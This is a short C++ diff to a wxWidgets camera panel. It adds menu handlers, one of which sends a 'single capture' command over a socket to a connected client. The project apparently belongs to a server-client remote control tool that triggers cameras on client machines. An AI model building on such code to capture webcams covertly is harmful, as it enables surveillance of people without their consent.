@@ -1,5 +1,6 @@
 #include "panel_camara.hpp"
 #include "frame_client.hpp"
+#include "misc.hpp"
 #include "server.hpp"
 
 extern Servidor* p_Servidor;
@@ -13,6 +14,8 @@ wxBEGIN_EVENT_TABLE(panelPictureBox, wxPanel)
 	//EVT_MENU(wxID_EXIT, panelPictureBox::OnExit)
 	EVT_CLOSE(panelPictureBox::OnClose)
 	EVT_PAINT(panelPictureBox::OnPaint)
+	EVT_MENU(EnumCamMenu::ID_SingleShot, panelPictureBox::OnSingleShot)
+	EVT_MENU(EnumCamMenu::ID_StartLive, panelPictureBox::OnLive)
 wxEND_EVENT_TABLE()
 
 panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamIndex) :
@@ -52,7 +55,17 @@ void panelPictureBox::OnClose(wxCloseEvent& event) {
 	Destroy();
 }
 
-panelPictureBox::~panelPictureBox() {
+void panelPictureBox::OnSingleShot(wxCommandEvent& event) {
+	//Enviar comando para obtener captura sencilla
+	std::vector<std::string> vcTmp = strSplit(this->GetTitle().ToStdString(), ' ', 10);
+	std::string strComando = std::to_string(EnumComandos::CM_Single);
+	strComando.append(1, CMD_DEL);
+	strComando += vcTmp[vcTmp.size() - 1];
+
+	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+}
+
+void panelPictureBox::OnLive(wxCommandEvent& event) {
 	return;
 }
 
